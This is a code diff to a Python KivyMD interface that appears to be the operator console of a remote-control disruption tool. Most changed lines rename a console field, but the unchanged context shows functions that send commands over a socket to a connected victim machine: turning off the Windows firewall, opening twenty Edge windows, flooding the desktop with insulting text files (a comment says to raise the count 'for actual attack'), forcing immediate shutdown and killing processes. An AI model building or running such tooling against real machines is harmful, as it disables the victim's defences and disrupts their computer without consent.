@@ -131,7 +131,8 @@ ScreenManager:
                     on_press: app.OpenBrowsers()
 
         MDTextField:
-            id: consoleField
+            id: disruptConsoleField
+            max_height: '200dp'
             hint_text: 'Console'
             multiline: True
 
@@ -420,7 +421,7 @@ class Main(MDApp):
     def Firewall(self):
         while True:
             # Reset console
-            self.root.ids.consoleField.text = ''
+            self.root.ids.disruptConsoleField.text = ''
 
             command = "netsh advfirewall set allprofiles state off"
             self.currConn.send(command.encode())
@@ -428,13 +429,13 @@ class Main(MDApp):
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
             print(f"Output: {output}")
-            self.root.ids.consoleField.text = output
+            self.root.ids.disruptConsoleField.text = output
             break
 
     # Prevent access to file
     def DenyFiles(self):
         # Reset console
-        self.root.ids.consoleField.text = ''
+        self.root.ids.disruptConsoleField.text = ''
         
         self.denyFilesDialog = MDDialog(
             title = "File Path:",
@@ -463,6 +464,7 @@ class Main(MDApp):
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
+            self.root.ids.disruptConsoleField.text = output
             self.killTaskDialog.dismiss(force=True)
             break
 
@@ -471,12 +473,12 @@ class Main(MDApp):
     def OpenBrowsers(self):
         while True:
             # Reset console
-            self.root.ids.consoleField.text = ''
+            self.root.ids.disruptConsoleField.text = ''
 
             command = 'FOR /L %A IN (1 1 20) DO (start msedge)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            self.root.ids.consoleField.text = command
+            self.root.ids.disruptConsoleField.text = command
             break
 
     # Zees Severe Disruption
@@ -484,12 +486,12 @@ class Main(MDApp):
     def FileCreate(self):
         while True:
             # Reset console
-            self.root.ids.consoleField.text = ''
+            self.root.ids.disruptConsoleField.text = ''
             # Replace 20 with a larger number for actual attack
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            self.root.ids.consoleField.text = command
+            self.root.ids.disruptConsoleField.text = command
             break
 
     # Zees Simple Disruptions
@@ -497,19 +499,19 @@ class Main(MDApp):
     def Shutdown(self):
         while True:
             # Reset console
-            self.root.ids.consoleField.text = ''
+            self.root.ids.disruptConsoleField.text = ''
 
             # /t is Timer
             command = 'shutdown /s /t 00'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            self.root.ids.consoleField.text = command
+            self.root.ids.disruptConsoleField.text = command
             break
 
     #Kill Task Disruption
     def KillTask(self):
         # Reset console
-        self.root.ids.consoleField.text = ''
+        self.root.ids.disruptConsoleField.text = ''
 
         self.killTaskDialog = MDDialog(
             title = "Task Kill:",
@@ -538,7 +540,7 @@ class Main(MDApp):
             recvsize = self.currConn.recv(8096).decode()
             output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
-            self.root.ids.consoleField.text = output
+            self.root.ids.disruptConsoleField.text = output
             self.killTaskDialog.dismiss(force=True)
             break
 
